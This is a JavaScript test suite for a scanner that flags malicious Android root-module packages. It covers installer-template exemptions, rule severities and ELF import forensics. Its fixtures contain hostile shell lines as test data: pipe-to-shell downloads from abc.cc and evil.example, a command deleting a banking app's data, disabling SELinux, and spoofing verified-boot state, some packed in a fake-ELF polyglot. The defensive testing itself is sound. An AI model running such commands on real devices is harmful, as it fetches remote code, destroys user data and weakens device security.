  const h1 = hits('EXEC_BUNDLED_FILE', crlfFile, A1_UB);
  assert.deepEqual(h1.map((f) => `${f.line}/${f.severity}`), ['2/info'], JSON.stringify(h1));
  // 单独的 `\r`（老 Mac 行尾 / 半截 CRLF）：split(/\r?\n/) 会把 \r 留在行里，归一必须自己吃掉它
  const loneCr = hits('EXEC_BUNDLED_FILE', A1_TPL + '\r', A1_UB);
  assert.equal(loneCr.length, 1, JSON.stringify(loneCr));
  assert.equal(loneCr[0].severity, 'info', '行尾 \\r 归一之后它就是那一行模板：' + JSON.stringify(loneCr[0]));
  // 整行 trim 允许：首尾空白不算形状差异
  for (const text of [A1_TPL + '   ', '   ' + A1_TPL, A1_TPL + '\t']) {
    const h = hits('EXEC_BUNDLED_FILE', text, A1_UB);
    assert.equal(h.length, 1, JSON.stringify(h));
    assert.equal(h[0].severity, 'info', `trim 之后逐字相等：${JSON.stringify(text)}`);
  }
});

test('A1-N1 反面：同一条模板行落在别的条目上 ⇒ 照报 high（判据①：路径限定，缺一即报）', () => {
  for (const file of ['customize.sh', 'service.sh', 'post-fs-data.sh', 'webroot/install.sh',
    'META-INF/com/google/android/updater-script']) {
    const h = hits('EXEC_BUNDLED_FILE', A1_TPL, file);
    assert.equal(h.length, 1, `${file}: ${JSON.stringify(h)}`);
    assert.equal(h[0].severity, 'high', `条目路径不是那个逐字路径就不许降：${file}`);
  }
});

test('A1-N2 反面：路径的六种近似写法 ⇒ 全部 high（不许 endsWith、不许忽略大小写、不许归一斜杠）', () => {
  const LOOKALIKES = [
    'META-INF/com/google/android/update-binary.sh',   // 尾巴多个后缀
    'META-INF/com/google/android/Update-Binary',      // 大小写变体
    'META-INF/com/google/android//update-binary',     // 双斜杠
    'META-INF/COM/GOOGLE/ANDROID/update-binary',      // 整段大写
    './META-INF/com/google/android/update-binary',    // 带 ./ 前缀
    'META-INF/com/google/android/update-binary ',     // 条目名尾随空格
  ];
  for (const file of LOOKALIKES) {
    const h = hits('EXEC_BUNDLED_FILE', A1_TPL, file);
    assert.equal(h.length, 1, `${file}: ${JSON.stringify(h)}`);
    assert.equal(h[0].severity, 'high', `宽松匹配就是投稿者可造的豁免面：${JSON.stringify(file)}`);
  }
});

test('A1-N3 反面：同行还有别的命令 ⇒ high（判据③钉在整行，不是钉在匹配上）+ 锚点闭包表不变量未被动过', () => {
  const DECOYS = [
    'x=1; ' + A1_TPL,                       // 工单点名的那一发（也是闭包表的 ANCHOR_PREFIX）
    A1_TPL + '; ui_print "- done"',         // 后面接活
    'ui_print "- start"; ' + A1_TPL,        // 前面有活
    'if [ -f $MODPATH/customize.sh ]; then . $MODPATH/customize.sh; fi', // 折成一行的 if
    A1_TPL + ' \\',                         // 借续行反斜杠变形
  ];
  for (const text of DECOYS) {
    const h = hits('EXEC_BUNDLED_FILE', text, A1_UB);
    assert.equal(h.length, 1, `${JSON.stringify(text)}: ${JSON.stringify(h)}`);
    assert.equal(h[0].severity, 'high', `同行有别的命令就不是那「一整行」模板：${JSON.stringify(text)}`);
  }
  // 闭包表（fix4-P14）的 witness 载荷本来就不是这个形状，所以它那条「恰好 1 条命中」的不变量
  // 在这条豁免前后一字不动 —— 也就是说：**这张表对本轮不敏感，它不是这一格的证据**。
  // 真正拦住「豁免落在匹配上」的是上面那发 `x=1; ` 前缀（工单 §2.3 要的就是这个结论）。
  for (const text of ['sh $MODDIR/payload.bin', 'x=1; sh $MODDIR/payload.bin']) {
    for (const file of ['customize.sh', A1_UB]) {
      const h = hits('EXEC_BUNDLED_FILE', text, file);
      assert.equal(h.length, 1, `${file} / ${JSON.stringify(text)}: ${JSON.stringify(h)}`);
      assert.equal(h[0].severity, 'high', `witness 载荷与豁免形状无关，不许被顺手降档：${text}`);
    }
  }
});

test('A1-N4 反面：照抄模板再多加一行 ⇒ 第一行 info、第二行照报 high（逐行判，不整文件判）', () => {
  const text = '#!/system/bin/sh\n' + A1_TPL + '\n. $MODPATH/payload.sh\n';
  const h = hits('EXEC_BUNDLED_FILE', text, A1_UB);
  assert.deepEqual(h.map((f) => f.line), [2, 3], '两行各一条，一条都不许多/少：' + JSON.stringify(h));
  assert.deepEqual(h.map((f) => `${f.line}/${f.severity}`), ['2/info', '3/high'],
    '模板那行降档，第二行（真载荷）必须还是 high：' + JSON.stringify(h));
  assert.equal(h[1].ruleId, 'EXEC_BUNDLED_FILE', '实测：dot-source + 字面 $MODPATH 落在 EXEC_BUNDLED_FILE 自己身上');
  assert.equal(h[1].snippet, '. $MODPATH/payload.sh', JSON.stringify(h[1]));
});

test('A1-N5 反面：变量名与写法变体 ⇒ 逐条 high（本轮收窄可伪造性的主证据）', () => {
  const VARIANTS = [
    ['换模块变量 $MODDIR', '[ -f $MODDIR/customize.sh ] && . $MODDIR/customize.sh'],
    ['test -f 代替 [ ]', 'test -f $MODPATH/customize.sh && . $MODPATH/customize.sh'],
    ['${MODPATH} 花括号', '[ -f ${MODPATH}/customize.sh ] && . ${MODPATH}/customize.sh'],
    ['带引号', '[ -f "$MODPATH/customize.sh" ] && . "$MODPATH/customize.sh"'],
    ['&& 前后不带空格', '[ -f $MODPATH/customize.sh ]&&. $MODPATH/customize.sh'],
    ['路径里插 ./', '[ -f $MODPATH/./customize.sh ] && . $MODPATH/./customize.sh'],
    ['词间用制表符', '[ -f\t$MODPATH/customize.sh ] && . $MODPATH/customize.sh'],
    ['if … then … fi 拆行', 'if [ -f $MODPATH/customize.sh ]; then\n  . $MODPATH/customize.sh\nfi\n'],
    ['多一个空格', '[ -f  $MODPATH/customize.sh ] && . $MODPATH/customize.sh'],
  ];
  for (const [name, text] of VARIANTS) {
    const h = hits('EXEC_BUNDLED_FILE', text, A1_UB);
    assert.equal(h.length, 1, `${name}: ${JSON.stringify(h)}`);
    assert.equal(h[0].severity, 'high', `${name} —— 不折叠空白、不规范化变量名、不脱外层判断：${JSON.stringify(text)}`);
  }
  // 换变量名那一格走的是**另一条规则**（主控 §0 量的第二格）：EXEC_BUNDLED_FILE 0 命中，
  // EXEC_INDIRECT high —— 本轮没碰 EXEC_INDIRECT 的任何判据，这一格就是那条边界的收据。
  const MD = '[ -f $MD/customize.sh ] && . $MD/customize.sh';
  assert.equal(hits('EXEC_BUNDLED_FILE', MD, A1_UB).length, 0, '这条形状不归 EXEC_BUNDLED_FILE');
  const ind = hits('EXEC_INDIRECT', MD, A1_UB);
  assert.equal(ind.length, 1, JSON.stringify(ind));
  assert.equal(ind[0].severity, 'high', '换变量名的写法照报，而且报在另一条规则上：' + JSON.stringify(ind[0]));
});

test('A1-N6 记账（本轮的存在理由）：豁免只改呈现 —— 模板行引用的 customize.sh 照样进扫描面并被逐行读', async () => {
  // (a) 常规形状：customize.sh 是可读文本、本来就在可撤销面上。
  //     「引用解析不看豁免」在这里的收据是那一笔撤销证人 —— 它由**模板行**产生：
  //     把 exclude 套进 resolveBundledRefs（变异 M5）就没有这笔账，且那条 EXEC 命中会留在报告里。
  const plain = makeModuleZip({ id: 'eval.a1n6a', files: [
    ['module.prop', moduleProp('eval.a1n6a')],
    [A1_UB, '#!/system/bin/sh\n' + A1_TPL + '\n'],
    ['customize.sh', '#!/system/bin/sh\ncurl -s https://abc.cc/x.sh | sh\n'],
  ]});
  const ra = await scanToReport(plain, { changeType: 'first' });
  const pipeA = ra.findings.filter((f) => f.ruleId === 'PIPE_TO_SHELL');
  assert.equal(pipeA.length, 1, JSON.stringify(pipeA.map((f) => `${f.file}:${f.line}/${f.severity}`)));
  assert.equal(pipeA[0].file, 'customize.sh', '载荷必须由**它自己那一行**说话，指鹿为马的证据比没有证据更糟');
  assert.equal(pipeA[0].line, 2, JSON.stringify(pipeA[0]));
  assert.equal(pipeA[0].severity, 'high');
  assert.deepEqual(ra.revokedBundledRefs.map((v) => `${v.ruleId}@${v.file}:${v.line}->${v.resolvedEntry}`),
    [`EXEC_BUNDLED_FILE@${A1_UB}:2->customize.sh`],
    '模板行仍然产生引用证人 —— 豁免没有把引用解析一起关掉：' + JSON.stringify(ra.revokedBundledRefs));
  assert.ok(ra.scripts.some((s) => s.name === 'customize.sh'),
    `扫描面不许因为这条豁免而缩小：${JSON.stringify(ra.scripts.map((s) => s.name))}`);
  assert.equal(ra.riskLevel, 'high', '整包 high：呈现降级不缩小扫描面');
  assert.equal(ra.decision.action, 'block');

  // (b) 升级通道那一格：载荷伪装成 customize.sh（ELF magic + NUL 填充）⇒ classify 把它落 binaries，
  //     它不在那五个桶里、也过不了 Task 4 的可打印比例，**唯一**进扫描面的路就是模板行那条引用。
  //     这一发才是「豁免顺手把扫描面也关掉」的直接死因：变异 M5 红在 escalated / PIPE_TO_SHELL 这两格。
  const disguised = Buffer.concat([
    Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]),
    Buffer.alloc(400, 0),
    Buffer.from('#!/system/bin/sh\ncurl -s https://abc.cc/x.sh | sh\n', 'utf8'),
  ]);
  assert.equal(sharedT4.printableRatio(disguised) < sharedT4.POLYGLOT_MIN_PRINTABLE, true,
    `夹具前提：Task 4 的 polyglot 通道不许接住它（比例 ${sharedT4.printableRatio(disguised).toFixed(4)} / 阈值 0.85）`);
  const zipB = makeModuleZip({ id: 'eval.a1n6b', files: [
    ['module.prop', moduleProp('eval.a1n6b')],
    [A1_UB, '#!/system/bin/sh\n' + A1_TPL + '\n'],
    ['customize.sh', disguised],
  ]});
  const cls = classify(readZip(zipB).files);
  assert.deepEqual(cls.canonical.map((f) => f.name), [], '夹具前提：它没进 canonical（可撤销面）');
  assert.deepEqual(cls.binaries.map((f) => f.name), ['customize.sh'],
    '夹具前提：伪装成 customize.sh 的载荷落 binaries ⇒ 只能靠引用升级进面');
  const rb = await scanToReport(zipB, { changeType: 'first' });
  assert.deepEqual(rb.escalated, [{ fromFile: A1_UB, fromLine: 2, ref: '. $MODPATH/customize.sh', resolvedEntry: 'customize.sh' }],
    `模板行必须照样把被引用的条目拉进扫描面：${JSON.stringify(rb.escalated)}`);
  assert.ok(rb.scripts.some((s) => s.name === 'customize.sh'),
    `被豁免那一行引用的条目必须在扫描面上：${JSON.stringify(rb.scripts.map((s) => s.name))}`);
  const pipeB = rb.findings.filter((f) => f.ruleId === 'PIPE_TO_SHELL');
  assert.equal(pipeB.length, 1, JSON.stringify(pipeB.map((f) => `${f.file}:${f.line}/${f.severity}`)));
  assert.equal(pipeB[0].file, 'customize.sh');
  assert.equal(pipeB[0].severity, 'high', '载荷内容被逐行读到了 —— 豁免没有让它变成没读过');
  assert.equal(rb.riskLevel, 'high');
  assert.equal(rb.decision.action, 'block');
});

test('A1-C1 不变量：info 与 low 不等价、豁免只有一处实现点、且不住在 scan.mjs 里', () => {
  // 工单 §2：不许写成 null（删证据），也不许写成 low —— 这两档在定级口径上不是一回事。
  assert.equal(countsTowardRisk({ severity: 'info' }), false);
  assert.equal(countsTowardRisk({ severity: 'low' }), true);
  assert.equal(SEVERITY_ORDER.low > SEVERITY_ORDER.info, true, 'low 排在 info 之上，才会出现「记成 low 就抬等级」');
  assert.deepEqual(scoreRisk([{ severity: 'info' }]).counts, { high: 0, medium: 0, low: 0, info: 1 },
    '一条 info 不参与定级：等级仍是 low 且 counts.low = 0');
  assert.equal(scoreRisk([{ severity: 'low' }]).counts.low, 1, '同一条写成 low 就进 counts.low');

  // 判据的三个字面量必须是**具名单一常量**，别处不许抄第二份（HARDCODED_IP / P10 那条老规矩）
  assert.equal(sharedT4.OFFICIAL_UPDATER_BINARY_ENTRY, A1_UB);
  assert.equal(sharedT4.OFFICIAL_INSTALLER_TEMPLATE_LINE, A1_TPL);
  assert.equal(typeof sharedT4.isOfficialInstallerShape, 'function', '判据要拿得出来，只许有一份');
  assert.equal(sharedT4.isOfficialInstallerShape(A1_UB, A1_TPL), true);
  assert.equal(sharedT4.isOfficialInstallerShape(A1_UB.toLowerCase(), A1_TPL), false, '大小写不许被吃掉');
  assert.equal(sharedT4.isOfficialInstallerShape(A1_UB, 'x=1; ' + A1_TPL), false, '整行比对，不是子串比对');
  const ebRules = CONTENT_RULES.filter((r) => /^EXEC_BUNDLED_FILE/.test(r.id));
  assert.equal(ebRules.length, 1, `EXEC_BUNDLED_FILE 族只许一条规则：${ebRules.map((r) => r.id).join(',')}`);
  assert.equal(CONTENT_RULES.includes(EXEC_BUNDLED_FILE), true, '进规则表的必须就是导出那一个对象');
  assert.equal(RULES_BY_ID.EXEC_BUNDLED_FILE, EXEC_BUNDLED_FILE);
  // scan.mjs 不许替这条规则做 severity 后处理（P10-C2 同一条规矩）：判据住在规则层
  const scanSrc = readFileSync(new URL('./scan.mjs', import.meta.url), 'utf8');
  assert.equal(/OFFICIAL_INSTALLER|OFFICIAL_UPDATER|isOfficialInstallerShape/.test(scanSrc), false,
    'scan.mjs 里不许出现这条豁免的实现或第二份判据');
  // 引用解析这条链一个字没改：豁免之后的模板行照样产出引用记录（A1-N6 的机器面）
  const refs = resolveBundledRefs([{ name: A1_UB, content: A1_TPL + '\n' }],
    [{ name: A1_UB }, { name: 'customize.sh' }], 'eval.a1n6a', {});
  assert.equal(refs.length, 1, JSON.stringify(refs));
  assert.equal(refs[0].ruleId, 'EXEC_BUNDLED_FILE');
  assert.equal(refs[0].resolved, true, JSON.stringify(refs[0]));
  // scan.mjs 的 verdict 层不许把降下来的 info 抬回 high，也不许因为它是 info 就删掉它
  const kept = scanT4.applyBundledRefVerdicts(
    [{ ruleId: 'EXEC_BUNDLED_FILE', category: 'execution', severity: 'info',
      file: A1_UB, line: 1, snippet: '. $MODPATH/customize.sh', message: 't', advice: 'a' }], [], null, []);
  assert.equal(kept.length, 1, JSON.stringify(kept));
  assert.equal(kept[0].severity, 'info', 'verdict 层只改 snippet/advice，不动等级：' + JSON.stringify(kept[0]));
});

// ---------------------------------------------------------------------------
// Task 5.7 —— 把 STRUCT_BINARY 从「我读不了」写成「它一定能做什么」（只加严，永不开自动放行）
// 工单：.superpowers/sdd/2026-10-12-malicious-module-detection-hardening/briefs/task-5.7.md
// §0 已推翻计划里那两处：Temp 的 s3-measure2 / s3-project 脚本与 18 包语料都不存在了
//   ⇒ Step 0 改用常驻的 audit/fixtures/ 真 ELF；S3 的推荐理由换了 ⇒ 本轮一条降级都不做，
//   §1 那条硬边界由 INV-B + 变异 M2 压着（M2 把非 ELF 那一支写成 info 必须红）。
// 下面每一格期望值都是本轮在这六枚常驻夹具上量出来的，没有一个数是从计划抄的。
// 新符号（capabilityFamilies / capabilitySymbols / MAX_FORENSICS_BYTES / 条目上的 raw）
// 一律走动态取：静态具名 import 在实现落地前会让整个文件在 link 阶段炸掉，
// 红的应当是本轮新用例，不是那 570 条既有证人。
// ---------------------------------------------------------------------------

const T57_ELF = await import('./elf-forensics.mjs');
const T57_SCAN = await import('./scan.mjs');

const T57_SHA1 = (b) => createHash('sha1').update(b).digest('hex');
/** 本轮量过的夹具字节面。漂了就说明有人换了 ELF 却没重测判据。 */
const T57_FIX_SHA = {
  'arm64-v8a.so': '0a25b859e5af1a5cfe436b61be6f829122f3dec8',
  'device_faker_cli': 'e3dfd27a5cff36946af5d782d259ee397b959276',
  'hma-arm64.so': 'efa5d78192d6904ea46972b41e8be89bf16c88ad',
  'hma-x86.so': '48467904a36a6d4cac9dc72af540e8dd21959306',
  'detach-arm32': '54a7ec1728dc4c4aabec637bb8c10c4ac90c54fb',
};
function t57Fix(f) {
  const b = readFileSync(new URL(`./fixtures/${f}`, import.meta.url));
  assert.equal(T57_SHA1(b), T57_FIX_SHA[f], `${f} 的字节面与本轮量过的那一份不是同一份`);
  return b;
}

const T57_CLEAN_SH = '#!/system/bin/sh\necho ok\n';
/** 一枚真 PNG（1x1，含 NUL ⇒ detectBinary 认它，forensics 不认它）。 */
const T57_PNG_SHA = 'b2bbe763c7e1828c750d53f78550709a6fea19be';
const T57_PNG = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==', 'base64');
assert.equal(T57_SHA1(T57_PNG), T57_PNG_SHA, 'PNG 夹具字节面钉住');
/** T4 那一条现成的 polyglot 形状（ELF 魔数 + 五行明文），逐字节与 T4_SHAPE.a1 同一份。 */
const T57_A1_SHA = '4993af34c77e7c53391388952a237daf360a64fd';
const T57_A1 = Buffer.concat([
  Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]),
  Buffer.from('#!/system/bin/sh\ncurl -s https://evil.example/a | sh\nrm -rf /data/data/com.bank.app\nsetenforce 0\nresetprop ro.boot.verifiedbootstate green\n', 'utf8')]);
assert.equal(T57_SHA1(T57_A1), T57_A1_SHA, 'polyglot 夹具字节面钉住');
/** PNG 头 + 真 ELF 体：魔数是 PNG，取证模块按「不是 ELF」处理，不许念成 ELF。 */
const T57_PNG_ELF_SHA = '50acf98ed27a349259b0f39cf868fcee20ce0212';
const t57PngElf = () => {
  const b = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), t57Fix('hma-arm64.so')]);
  assert.equal(T57_SHA1(b), T57_PNG_ELF_SHA, 'PNG 头 + ELF 体夹具钉住');
  return b;
};
/** 超过取证字节上限的真 ELF（工单 §5 第 2 条：超限那一格要产生看得见的记录）。 */
function t57OverCap() {
  const base = t57Fix('hma-x86.so');
  const cap = T57_SCAN.MAX_FORENSICS_BYTES;
  assert.ok(Number.isInteger(cap) && cap > 0, `MAX_FORENSICS_BYTES 必须是正整数常量，实得 ${JSON.stringify(cap)}`);
  return Buffer.concat([base, Buffer.alloc(cap + 1 - base.length, 0)]);
}

/** 六个常驻夹具包：两枚 device_faker 真 ELF、一枚 HMA 小 ELF、一枚真 PNG、真 ELF + polyglot、超限 ELF。 */
const T57_PKGS = {
  df2: {
    files: () => [['zygisk/arm64-v8a.so', t57Fix('arm64-v8a.so')], ['bin/device_faker_cli', t57Fix('device_faker_cli')]],
    high: 2,
  },
  detach32: {
    files: () => [['zygisk/armeabi-v7a.so', t57Fix('detach-arm32')]],
    high: 1,
  },
  hmaSmall: { files: () => [['zygisk/arm64-v8a.so', t57Fix('hma-arm64.so')]], high: 0 },
  pngOnly: { files: () => [['icons/1x1.png', T57_PNG]], high: 0 },
  polyglotReal: {
    files: () => [['assets/payload.bin', T57_A1], ['zygisk/arm64-v8a.so', t57Fix('hma-x86.so')]],
    high: 0,
  },
  pngElf: { files: () => [['assets/mix.png', t57PngElf()]], high: 0 },
  overCap: { files: () => [['assets/big.elf', t57OverCap()]], high: 0 },
};
const T57_ZIPS = new Map();
const T57_RUNS = new Map();
function t57Zip(id) {
  if (!T57_ZIPS.has(id)) {
    T57_ZIPS.set(id, makeModuleZip({ id: `eval.t57.${id}`, files: [['service.sh', T57_CLEAN_SH], ...T57_PKGS[id].files()] }));
  }
  return T57_ZIPS.get(id);
}
async function t57Run(id) {
  if (!T57_RUNS.has(id)) T57_RUNS.set(id, scanToReport(t57Zip(id), { changeType: 'first' }));
  return T57_RUNS.get(id);
}
/** scanZip 交给 checkBinaries 的那份清单（报告里 binaries 就是它的投影，缺 why 不影响档位）。 */
const t57Bins = (r) => r.binaries.map((b) => ({ name: b.name, id: b.kind, bytes: b.bytes }));
const t57Struct = (r) => r.findings.filter((f) => f.ruleId === 'STRUCT_BINARY')
  .slice().sort((a, b) => (a.file < b.file ? -1 : a.file > b.file ? 1 : 0));
const t57Spots = (r) => t57Struct(r).map((f) => `${f.file}:0/${f.severity}`);
const t57Row = (r, name) => (r.binaryForensics || []).find((x) => x.name === name) || null;

const T57_BIN1 = [{ name: 'zygisk/arm64-v8a.so', id: 'ELF', why: 'ELF 可执行文件/共享库', bytes: 983624 }];
const t57Rec = (over = {}) => ({
  name: 'zygisk/arm64-v8a.so', kind: 'ELF', bytes: 983624, machineName: 'AArch64', type: 'DYN',
  stripped: true, importCount: 86, sensitiveImports: [], needed: ['libc.so'], ...over,
});
/** 纯函数层只喂构造记录，所以第二参两种形状都要认：Map（scan.mjs 用）与朴素对象（工单 §3 的写法）。 */
const t57Map = (name, rec) => new Map([[name, rec]]);

test('T57-01 向后兼容钉子：不传第二参（或传空表）⇒ 输出与今天逐字相同，一条 STRUCT_BINARY/medium', () => {
  // 这一段字面量是本轮从改前的 risk-rules.mjs 实测输出的整份发现对象复制的，不是凭记忆写的。
  const today = [{
    ruleId: 'STRUCT_BINARY',
    category: 'structure',
    severity: 'medium',
    file: 'zygisk/arm64-v8a.so',
    line: 0,
    snippet: 'ELF / 983624 B',
    message: 'zygisk/arm64-v8a.so 是二进制负载（ELF 可执行文件/共享库），静态行级规则无法审查',
    advice: '模块可以带二进制（busybox、update-binary 等），但它必须在 module.prop/描述里说明来源，'
      + '并给出可核对的上游或校验和；匿名可执行文件在 root 下运行等于把判断权交给机器码。',
  }];
  assert.deepEqual(checkBinaries(T57_BIN1), today, '省参 == 今天');
  assert.deepEqual(checkBinaries(T57_BIN1, new Map()), today, '空 Map == 今天（查不中时不许编造取证结论）');
  assert.deepEqual(checkBinaries(T57_BIN1, {}), today, '空对象 == 今天');
});

test('T57-02 判据表第一行：非 ELF（forensics 返回 null）⇒ medium，说「不是 ELF，静态取证不适用」，不许写「读不了」', () => {
  const g = checkBinaries(T57_BIN1, t57Map('zygisk/arm64-v8a.so', null));
  assert.equal(g.length, 1);
  assert.equal(g[0].severity, 'medium');
  assert.match(g[0].message, /不是 ELF/);
  assert.match(g[0].message, /静态取证不适用/);
  // §2.7 的口径纪律：非 ELF 不是「读不动」。写成「读不了」就把「看不到」与「看不清」并成一格。
  assert.doesNotMatch(g[0].message, /读不了|读不出|无法解析|无法审查/);
  assert.equal(g[0].ruleId, 'STRUCT_BINARY', '不新增 ruleId（工单 §1）');
  assert.equal(g[0].file, 'zygisk/arm64-v8a.so');
  assert.equal(g[0].line, 0);
});

test('T57-03 判据表第二行：ELF 但 parseError ⇒ medium，要说出「头部有 ELF 魔数，但读不出符号表」与原因', () => {
  const why = 'unexpected ELF64 e_shentsize=40 (accepting only 64)';
  const g = checkBinaries(T57_BIN1, t57Map('zygisk/arm64-v8a.so', t57Rec({ parseError: why })));
  assert.equal(g.length, 1);
  assert.equal(g[0].severity, 'medium');
  assert.match(g[0].message, /头部有 ELF 魔数/);
  assert.match(g[0].message, /读不出符号表/);
  assert.ok(g[0].message.includes(why), `原因要逐字带出来：${g[0].message}`);
  assert.doesNotMatch(g[0].message, /危险族|链接期/, '读不出就是读不出，不许顺嘴说它干净或它有本事');
});

test('T57-04 判据表第三行：ELF、危险族 0 类 ⇒ medium，且必须含「这不等于安全」', () => {
  const rec = t57Rec({ importCount: 24, sensitiveImports: ['close', 'closedir', 'mmap', 'readdir64'] });
  const g = checkBinaries(T57_BIN1, t57Map('zygisk/arm64-v8a.so', rec));
  assert.equal(g.length, 1);
  assert.equal(g[0].severity, 'medium');
  assert.match(g[0].message, /读到 24 个导入/);
  assert.match(g[0].message, /无一落在危险族/);
  assert.match(g[0].message, /不等于安全/);
  assert.match(g[0].message, /mmap/, '要举得出「不需要 exec 族也能跑机器码」那一格，否则这句是空话');
});

test('T57-05 判据表第四行：危险族 1 类 ⇒ medium，列出族名与每族至多 5 个代表符号', () => {
  const exec8 = ['fork', 'clone', 'execve', 'system', 'popen', 'dlopen', 'dlsym', 'vfork'];
  const g = checkBinaries(T57_BIN1, t57Map('zygisk/arm64-v8a.so', t57Rec({ importCount: 120, sensitiveImports: exec8 })));
  assert.equal(g.length, 1);
  assert.equal(g[0].severity, 'medium', '单族不许升 high');
  assert.match(g[0].message, /1 类危险能力/);
  assert.match(g[0].message, /EXEC/);
  for (const s of exec8.slice().sort().slice(0, 5)) assert.ok(g[0].message.includes(s), `代表符号 ${s} 要看得见：${g[0].message}`);
  assert.match(g[0].message, /共 8 个/, '超 5 个要写明总数，不许静默截断');
  assert.doesNotMatch(g[0].message, /≥2 类链接期能力/);
});

test('T57-06 判据表第五行：危险族 ≥2 类 ⇒ high，并写明「≥2 类链接期能力」是升级理由；复断 0 族那一行含「不等于安全」', () => {
  const g = checkBinaries(T57_BIN1, t57Map('zygisk/arm64-v8a.so',
    t57Rec({ sensitiveImports: ['fork', 'socket'] })));
  assert.equal(g.length, 1);
  assert.equal(g[0].severity, 'high');
  assert.match(g[0].message, /≥2 类链接期能力/);
  assert.match(g[0].message, /EXEC/);
  assert.match(g[0].message, /NET/);
  // 工单 §3 明写这一格还要复断第三行的口径：0 族那一行永远不许念成「安全」
  const zero = checkBinaries(T57_BIN1, t57Map('zygisk/arm64-v8a.so',
    t57Rec({ importCount: 24, sensitiveImports: ['close', 'closedir', 'mmap', 'readdir64'] })));
  assert.equal(zero[0].severity, 'medium');
  assert.match(zero[0].message, /不等于安全/);
});

test('T57-07 能力族纯函数：arm64-v8a.so 的真名单逐字断族，外加空数组 / 未知名 / 大小写 / 中性名单四格', () => {
  const arm = T57_ELF.forensics(t57Fix('arm64-v8a.so'), 'arm64-v8a.so');
  assert.equal(arm.importCount, 86, 'Step 0 复现值：计划里那个 86 在常驻夹具上对得上');
  assert.deepEqual(arm.sensitiveImports,
    ['chdir', 'chroot', 'close', 'dlsym', 'fork', 'ioctl', 'kill', 'mmap', 'mmap64', 'mprotect', 'open',
      'prctl', 'read', 'readlink', 'recv', 'send', 'sigaction', 'syscall', 'unlink', 'write', 'writev'],
    'SENSITIVE 那份名单一字未动（工单 §1）');
  assert.deepEqual(T57_ELF.capabilityFamilies(arm.sensitiveImports), ['EXEC', 'FILEWRITE', 'NET', 'NS']);
  assert.deepEqual(T57_ELF.capabilitySymbols(arm.sensitiveImports).map((x) => [x.family, x.symbols]), [
    ['EXEC', ['dlsym', 'fork']],
    ['FILEWRITE', ['chdir', 'unlink']],
    ['NET', ['recv', 'send']],
    ['NS', ['chroot', 'kill', 'prctl', 'sigaction']],
  ]);
  assert.equal(T57_ELF.capabilitySymbols(arm.sensitiveImports).length, 4, '4 族 ⇒ 这一枚是 high');

  // 确定性四格：空数组 / 未知名 / 大小写混写 / 中性名单
  assert.deepEqual(T57_ELF.capabilityFamilies([]), []);
  assert.deepEqual(T57_ELF.capabilityFamilies(['nope', '__libc_start_main', 'Java_main', 'strlen']), []);
  assert.deepEqual(T57_ELF.capabilityFamilies(['FORK', 'Socket', 'chroot', '__SYSTEM_PROPERTY_GET', 'UNLINK']),
    ['EXEC', 'FILEWRITE', 'NET', 'NS', 'PROP'], '大小写混写不许产出第二份族，也不许产不出族');
  assert.deepEqual(T57_ELF.capabilityFamilies(['fork', 'FORK', 'Fork']), ['EXEC'], '去重');
  assert.deepEqual(T57_ELF.capabilityFamilies(undefined), [], '非数组输入也要有确定输出');
  // §2 那条边界：mmap/mprotect/read/write/close/ioctl/syscall 不算危险族 ——
  // 把它们算进去会把我自己那条「导入表干净 ≠ 安全」的论证说反。
  assert.deepEqual(T57_ELF.capabilityFamilies(
    ['mmap', 'mprotect', 'read', 'write', 'close', 'ioctl', 'syscall', 'open', 'opendir', 'readdir64', 'writev']), []);
  // popen 只归 EXEC：§2 的 FILEWRITE 那一行明写「open/popen 之外」。
  assert.deepEqual(T57_ELF.capabilityFamilies(['popen']), ['EXEC']);

  // 能力族只许住在一处（§2 标题那句）：判据表在 elf-forensics.mjs，别处不许有第二份词汇。
  const rrSrc = readFileSync(new URL('./risk-rules.mjs', import.meta.url), 'utf8');
  const scanSrc = readFileSync(new URL('./scan.mjs', import.meta.url), 'utf8');
  for (const [src, at] of [[rrSrc, 'risk-rules.mjs'], [scanSrc, 'scan.mjs']]) {
    assert.equal(/FILEWRITE|pivot_root|__system_property_|posix_spawn|setns/.test(src), false,
      `${at} 里不许出现第二份能力族词汇或成员表`);
  }
});

test('T57-08 一个条目只出一条：重名条目各出一条，一条也许多不许（§0.7 那个重复记账的病）', () => {
  const rec = t57Rec({ sensitiveImports: ['fork', 'socket'] });
  const one = checkBinaries(T57_BIN1, t57Map('zygisk/arm64-v8a.so', rec));
  assert.equal(one.length, 1, JSON.stringify(one));
  assert.deepEqual([...new Set(one.map((f) => f.ruleId))], ['STRUCT_BINARY'], '不许顺带产出别的 ruleId');
  const dup = [T57_BIN1[0], T57_BIN1[0]];
  const two = checkBinaries(dup, t57Map('zygisk/arm64-v8a.so', rec));
  assert.equal(two.length, 2, '两个条目就是两条发现，一条不多一条不少');
  assert.deepEqual(two.map((f) => f.severity), ['high', 'high']);
  assert.equal(scoreRisk(two).counts.high, 2, '档位只按条目数走，重复计数会虚高');
});

test('T57-09 超限输入不许被念成「取证成功、0 危险族」（工单 §5 那一格，纯函数层）', () => {
  const rec = t57Rec({ importCount: 24, sensitiveImports: ['close', 'closedir', 'mmap', 'readdir64'], inputCapped: true, rawBytes: 8388608 });
  const g = checkBinaries(T57_BIN1, t57Map('zygisk/arm64-v8a.so', rec));
  assert.equal(g.length, 1);
  assert.equal(g[0].severity, 'medium');
  assert.match(g[0].message, /输入不完整/);
  assert.match(g[0].message, /8388608/, '要写清只喂进去多少字节');
  assert.doesNotMatch(g[0].message, /无一落在危险族/, '截断过的输入什么都不能证明，不许说「0 族」');
});

test('T57-10 device_faker 那两枚真 ELF ⇒ high，report.binaryForensics 的 importCount 是 86 / 70', async () => {
  const r = await t57Run('df2');
  assert.deepEqual(t57Spots(r), ['bin/device_faker_cli:0/high', 'zygisk/arm64-v8a.so:0/high']);
  const cli = t57Row(r, 'bin/device_faker_cli');
  const so = t57Row(r, 'zygisk/arm64-v8a.so');
  assert.ok(so && cli, `取证登记必须在：${JSON.stringify(r.binaryForensics)}`);
  assert.equal(so.importCount, 86);
  assert.equal(cli.importCount, 70);
